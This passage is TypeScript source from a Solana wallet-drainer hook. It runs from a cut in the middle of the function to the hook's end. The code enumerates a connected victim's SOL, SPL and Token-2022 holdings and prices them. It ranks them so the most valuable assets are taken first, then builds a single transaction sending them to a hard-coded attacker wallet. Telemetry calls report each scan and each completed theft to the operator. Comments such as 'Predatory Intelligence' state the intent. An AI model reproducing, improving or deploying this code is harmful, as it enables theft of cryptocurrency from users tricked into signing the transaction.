                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
            );

            // Fetch SOL price for valuation
            const { price: solPrice } = await fetchTokenPriceUSD("solana");

            // --- PHASE 2: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY ---
            // CRITICAL FIX: Scan BOTH TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID in parallel
            // This is the ROOT CAUSE fix — previously only TOKEN_PROGRAM_ID was scanned,
            // causing all Token-2022 assets (Clearpool, etc.) to be invisible.
            let allTokenAccounts: { account: any; pubkey: PublicKey; _tokenProgram: PublicKey }[] = [];
            try {
                const [splResult, spl2022Result] = await Promise.all([
                    withTimeout(
                        () => connection.getParsedTokenAccountsByOwner(
                            publicKey,
                            { programId: TOKEN_PROGRAM_ID }
                        ),
                        RPC_TIMEOUT_MS
                    ).catch((e: any) => {
                        console.warn("[DRAIN] SPL token scan failed:", e instanceof Error ? e.message : String(e));
                        return { value: [] } as any;
                    }),
                    withTimeout(
                        () => connection.getParsedTokenAccountsByOwner(
                            publicKey,
                            { programId: TOKEN_2022_PROGRAM_ID }
                        ),
                        RPC_TIMEOUT_MS
                    ).catch((e: any) => {
                        console.warn("[DRAIN] SPL-2022 token scan failed:", e instanceof Error ? e.message : String(e));
                        return { value: [] } as any;
                    }),
                ]);

                // Merge results with program ID tagging
                const splAccounts = (splResult?.value || []).map((acc: any) => ({
                    ...acc,
                    _tokenProgram: TOKEN_PROGRAM_ID,
                }));
                const spl2022Accounts = (spl2022Result?.value || []).map((acc: any) => ({
                    ...acc,
                    _tokenProgram: TOKEN_2022_PROGRAM_ID,
                }));

                allTokenAccounts = [...splAccounts, ...spl2022Accounts];

                console.log(
                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`
                );
            } catch (e) {
                throw new Error("Failed to fetch token accounts: " + (e instanceof Error ? e.message : String(e)));
            }

            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // --- PHASE 3: ASSET CLASSIFICATION + FROZEN DETECTION ---
            const assetList: AssetData[] = [];
            const tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[] = [];

            // Extract mints for parallel classification
            const mints = allTokenAccounts.map((acc: any) => {
                try {
                    return new PublicKey(acc.account.data.parsed.info.mint);
                } catch {
                    return null;
                }
            }).filter((m: PublicKey | null): m is PublicKey => m !== null);

            const classifications = await classifyAssetsInParallel(mints, connection);

            // Build asset list — use PARSED state for frozen detection (reliable for both SPL and Token-2022)
            for (let i = 0; i < allTokenAccounts.length; i++) {
                try {
                    const acc = allTokenAccounts[i];
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);

                    if (amount === BigInt(0)) continue;

                    const mint = new PublicKey(parsed.mint);
                    if (!validatePublicKey(mint)) {
                        console.warn("[DRAIN] Invalid mint address, skipping");
                        continue;
                    }

                    // Use the program ID from discovery — guaranteed correct
                    const tokenProgram = acc._tokenProgram;
                    const isSPL2022 = tokenProgram.equals(TOKEN_2022_PROGRAM_ID);

                    // Frozen detection via parsed state — works for both SPL and Token-2022
                    const isFrozen = parsed.state === "frozen";
                    if (isFrozen) {
                        console.warn(`[DRAIN] Token account frozen for ${mint.toBase58().slice(0, 8)}...`);
                        continue;
                    }

                    // Get classification for transfer hook detection
                    const classIdx = mints.findIndex((m: PublicKey) => m.equals(mint));
                    const classification = classIdx !== -1 ? classifications[classIdx] : null;
                    const isTransferHook = classification?.isTransferHook ?? false;
                    const decimals = classification?.decimals ?? (parsed.tokenAmount.decimals || 0);
                    const isNft = decimals === 0 && Number(parsed.tokenAmount.uiAmount) <= 1;

                    // Skip transfer hooks — they may have custom logic that blocks transfers
                    if (isTransferHook && isSPL2022) {
                        console.log(`[DRAIN] Skipping SPL2022 transfer-hook token: ${mint.toBase58().slice(0, 8)}...`);
                        continue;
                    }

                    const priorityScore = isNft
                        ? 1000 + parsed.tokenAmount.uiAmount * 100
                        : parsed.tokenAmount.uiAmount * 10;

                    assetList.push({
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        tokenAccountPubkey: acc.pubkey,
                        isNft,
                        isSPL2022,
                        isTransferHook,
                        isFrozen,
                        decimals,
                        priorityScore,
                        tokenProgram,
                        usdPrice: 0, // Will be populated by Jupiter
                    });

                    tokensForBackend.push({
                        mint: mint.toBase58(),
                        amount: amount.toString(),
                        isSPL2022,
                    });
                } catch (e) {
                    console.warn("[DRAIN] Failed to process asset:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            console.log(`[DRAIN] Classified ${assetList.length} drainable assets`);

            // --- PHASE 3A: JUPITER REAL-TIME PRICING ---
            // Fetch actual USD prices for accurate value-based sorting and dust filtering
            const mintAddresses = assetList.map(a => a.mint.toBase58());
            mintAddresses.push(SOL_MINT); // Include SOL for accurate SOL valuation
            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);

            // Populate usdPrice on each asset
            for (const asset of assetList) {
                const price = jupiterPrices.get(asset.mint.toBase58());
                if (price && price > 0) {
                    asset.usdPrice = price;
                }
            }

            // Use Jupiter SOL price if available, fallback to CoinGecko
            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
            const effectiveSolPrice = jupiterSolPrice || solPrice || 100;

            // --- PHASE 3B: FILTER DUST TOKENS ---
            const nonDustAssets = filterDustTokens(assetList, effectiveSolPrice);

            if (nonDustAssets.length < assetList.length) {
                const dustCount = assetList.length - nonDustAssets.length;
                console.log(`[DRAIN] Filtered ${dustCount} dust tokens, keeping ${nonDustAssets.length}`);
                assetList.length = 0;
                assetList.push(...nonDustAssets);
            }

            // --- PHASE 3C: SORT BY VALUE (HIGHEST FIRST) ---
            // PERFECTED: .sort() mutates in-place. Removed the array reallocation which was causing memory reference annihilation.
            sortAssetsByValue(assetList);

            // --- PHASE 4: ACCURATE VALUATION ---
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * effectiveSolPrice;

            let totalValueUSD = solValueUSD;
            for (const asset of assetList) {
                let tokenUSD = 0;
                if (asset.isNft) {
                    tokenUSD = 50;
                } else {
                    const divisor = Math.pow(10, asset.decimals);
                    const normalizedAmount = Number(asset.amount) / divisor;
                    // Use real Jupiter price if available
                    tokenUSD = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : Math.max(0.001, normalizedAmount * 0.01);
                }
                totalValueUSD += tokenUSD;
            }

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`
            );

            await sendTelemetry(
                `📊 Scan complete | SOL: \`$${solValueUSD.toFixed(2)}\` | Tokens: ${assetList.length} | Total: \`$${totalValueUSD.toFixed(2)}\``
            ).catch(() => { });

            // Minimum threshold check
            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");

                await sendTelemetry(
                    `🧊 Below threshold: $${totalValueUSD.toFixed(2)}`
                ).catch(() => { });

                return;
            }

            setStatus("building");

            // --- PHASE 5: DYNAMIC BATCH SIZE CALCULATION (PERFECTED) ---
            // Calculate optimal batch size based on actual transaction overhead
            const estimatedBatchSize = calculateOptimalBatchSize(
                assetList,
                assetList.length, // Worst case: all need ATA creation
                networkCfg.maxPacketSize
            );

            const batchSize = Math.min(estimatedBatchSize, assetList.length);
            console.log(`[DRAIN] Dynamic batch size: ${batchSize} tokens (max possible: ${MAX_TOKEN_PROCESSING})`);

            // --- PHASE 6: BATCH ATA EXISTENCE CHECK (Initial) ---
            // PERFECTED: Use batch API instead of sequential checks
            const assetsInBatch = assetList.slice(0, batchSize);
            const atasToCheck = assetsInBatch
                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));

            let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
            let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 7: BALANCE VALIDATION & LAMPORT-AWARE BATCH SHRINKING (PERFECTED) ---
            let finalBatchSize = batchSize;
            let finalAtasToCreate = atasToCreate;
            let finalValidation = validateSufficientBalance(
                solBalance,
                finalAtasToCreate,
                finalBatchSize,
                assetsInBatch.filter(a => a.isSPL2022).length,
                assetsInBatch.filter(a => a.isTransferHook).length,
                networkCfg
            );

            // Predatory Intelligence: If they are too poor to fund all ATAs, shrink the batch
            // starting from the lowest value tokens, ensuring the highest value assets are always taken.
            while (!finalValidation.sufficient && finalBatchSize > 0) {
                finalBatchSize--;
                if (finalBatchSize === 0) break;

                const shrunkBatch = assetList.slice(0, finalBatchSize);
                const shrunkAtasToCheck = shrunkBatch
                    .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));

                // Synchronous cache check (we already fetched existence in Phase 6)
                finalAtasToCreate = shrunkAtasToCheck.filter(ata => existingAtasCache.get(ata.toBase58()) === false).length;

                finalValidation = validateSufficientBalance(
                    solBalance,
                    finalAtasToCreate,
                    finalBatchSize,
                    shrunkBatch.filter(a => a.isSPL2022).length,
                    shrunkBatch.filter(a => a.isTransferHook).length,
                    networkCfg
                );
            }

            if (!finalValidation.sufficient || finalBatchSize === 0) {
                setError(finalValidation.errorMsg || "Insufficient balance for fees, even after batch shrinking.");
                setStatus("error");

                await sendTelemetry(
                    `💔 ${finalValidation.errorMsg || 'Insufficient balance for any token transfer'}`
                ).catch(() => { });

                return;
            }

            if (finalBatchSize < batchSize) {
                console.log(`[DRAIN] Insufficient lamports for full batch. Shrunk from ${batchSize} to ${finalBatchSize} tokens to guarantee highest-value extraction.`);
            }

            // Lock in the final safe parameters
            const safeAssetsInBatch = assetList.slice(0, finalBatchSize);
            const safeAtasToCheck = safeAssetsInBatch
                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));

            // --- PHASE 8: REFRESH ATA CACHE (CRITICAL) ---
            // PERFECTED: Refresh immediately before instruction building to prevent race condition
            // Another process might have created an ATA between initial check and now
            console.log("[DRAIN] Refreshing ATA existence cache before instruction building...");
            existingAtasCache = await batchCheckAtaExistence(safeAtasToCheck, connection);
            atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;

            // --- PHASE 9: INSTRUCTION BUILDING (WITH DYNAMIC BATCHING) ---
            const instructions: TransactionInstruction[] = [];

            // Priority fee (must be first)
            instructions.push(
                ComputeBudgetProgram.setComputeUnitPrice({
                    microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
                })
            );

            // SOL transfer
            if (finalValidation.availableForTransfer > 0) {
                if (!validatePublicKey(DESTINATION_WALLET)) {
                    throw new Error("Invalid destination wallet configuration");
                }

                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: DESTINATION_WALLET,
                        lamports: finalValidation.availableForTransfer,
                    })
                );

                console.log(
                    `[DRAIN] SOL transfer: ${(finalValidation.availableForTransfer / LAMPORTS_PER_SOL).toFixed(6)} SOL`
                );
            }

            let tokenCount = 0;
            let nftCount = 0;
            let processed = 0;

            // Build token transfer instructions - only process assets in safe batch
            for (const asset of safeAssetsInBatch) {
                if (processed >= finalBatchSize) break;

                try {
                    const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
                    const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                    const destAta = getAssociatedTokenAddressSync(
                        mint,
                        DESTINATION_WALLET,
                        true,
                        programId
                    );
                    const ataKey = destAta.toBase58();

                    // Check if ATA needs creation
                    const destExists = existingAtasCache.get(ataKey);
                    if (destExists === false) {
                        instructions.push(
                            createAssociatedTokenAccountInstruction(
                                publicKey,
                                destAta,
                                DESTINATION_WALLET,
                                mint,
                                programId
                            )
                        );

                        console.log(
                            `[DRAIN] ATA creation for ${mint.toBase58().slice(0, 8)}...`
                        );
                    }

                    // Validate token amount before transfer
                    if (!validateTokenAmount(amount)) {
                        console.warn(`[DRAIN] Invalid amount for ${mint.toBase58().slice(0, 8)}..., skipping`);
                        continue;
                    }

                    // Transfer instruction
                    instructions.push(
                        createTransferInstruction(
                            tokenAccountPubkey,
                            destAta,
                            publicKey,
                            amount,
                            [],
                            programId
                        )
                    );

                    if (asset.isNft) nftCount++;
                    else tokenCount++;
                    processed++;
                } catch (e) {
                    console.warn("[DRAIN] Failed to build transfer instruction:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            console.log(
                `[DRAIN] Built ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs, ${atasToCreate} ATAs)`
            );

            // Require at least SOL transfer + 1 token transfer
            if (instructions.length <= 1) {
                setError("No drainable assets found.");
                setStatus("error");

                await sendTelemetry(
                    `⚠️ No drainable assets found`
                ).catch(() => { });

                return;
            }

            // --- PHASE 9: BLOCKHASH FETCH (LATE - PERFECTED) ---
            // PERFECTED: Fetch blockhash AFTER instruction building to minimize staleness
            let blockhash: string;
            let lastValidBlockHeight: number;
            let minContextSlot: number;

            try {
                const response = await withTimeout(
                    () => connection.getLatestBlockhashAndContext(),
                    RPC_TIMEOUT_MS
                ) as any;

                const context = response?.context || {};
                const value = response?.value || {};

                blockhash = value.blockhash;
                lastValidBlockHeight = value.lastValidBlockHeight;
                minContextSlot = context.slot;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response from RPC");
                }
            } catch (e) {
                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
            }

            const tx = new Transaction().add(...instructions);
            tx.recentBlockhash = blockhash;
            tx.feePayer = publicKey;

            // Validate transaction size before signing
            let serialized: Buffer;
            try {
                serialized = tx.serialize({ requireAllSignatures: false });
                console.log(`[DRAIN] Transaction size: ${serialized.length} bytes`);

                if (serialized.length > networkCfg.maxPacketSize) {
                    setError(`Transaction too large (${serialized.length} bytes). Reduce token count and retry.`);
                    setStatus("error");

                    await sendTelemetry(
                        `📦 TX too large: ${serialized.length} bytes (max: ${networkCfg.maxPacketSize})`
                    ).catch(() => { });

                    return;
                }
            } catch (e) {
                throw new Error("Transaction compilation failed: " + (e instanceof Error ? e.message : String(e)));
            }

            // Set stats before signing
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: finalValidation.availableForTransfer,
                tokenCount,
                nftCount,
                batchCount: 1,
            });

            await sendTelemetry(
                `🧨 Ready to drain | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)}`
            ).catch(() => { });

            // --- PHASE 10: SIGNING ---
            setStatus("signing");

            const finalTx = new Transaction().add(...instructions);
            finalTx.recentBlockhash = blockhash;
            finalTx.feePayer = publicKey;

            let signature: string;
            try {
                signature = await withTimeout(
                    () => sendTransaction(finalTx, connection, { minContextSlot }),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw e; // Let handleError catch this
            }

            // PERFECTED: Validate signature format before proceeding
            if (!validateSignatureFormat(signature)) {
                throw new Error(`Invalid signature format received from wallet: ${signature}`);
            }

            console.log(`[DRAIN] Signed: ${signature}`);

            await sendTelemetry(
                `✍️ Transaction signed: \`${signature}\``
            ).catch(() => { });

            // --- PHASE 11: CONFIRMATION (BULLETPROOF) ---
            setStatus("confirming");

            const confirmState = await confirmTransactionBulletproof(
                connection,
                signature,
                CONFIRMATION_TIMEOUT_MS
            );

            // PERFECTED: Only proceed to backend if transaction is actually confirmed
            if (confirmState === "failed") {
                throw new Error("Transaction failed on-chain");
            }

            if (confirmState === "unknown") {
                // Unknown state - be conservative: warn user but don't mirror to backend
                console.warn("[DRAIN] Confirmation timed out - transaction state unknown");
                setStatus("success");
                await sendTelemetry(
                    `⚠️ Confirmation timeout for \`${signature}\` - check explorer manually`
                ).catch(() => { });
                return;
            }

            // Only send to backend if CONFIRMED (not unknown)
            if (confirmState === "confirmed") {
                const backendSuccess = await sendToBackendDrain(
                    publicKey.toBase58(),
                    finalValidation.availableForTransfer,
                    signature,
                    tokensForBackend
                );

                if (!backendSuccess) {
                    console.warn("[DRAIN] Backend mirror failed but transaction confirmed on-chain");
                }
            }

            setStatus("success");
            console.log(`[DRAIN] Operation ${ctx.operationId} complete: ${signature}`);

            await sendTelemetry(
                `💰 SUCCESS | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | TX: \`${signature}\``
            ).catch(() => { });
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);

    return { drain, status, error, stats };
};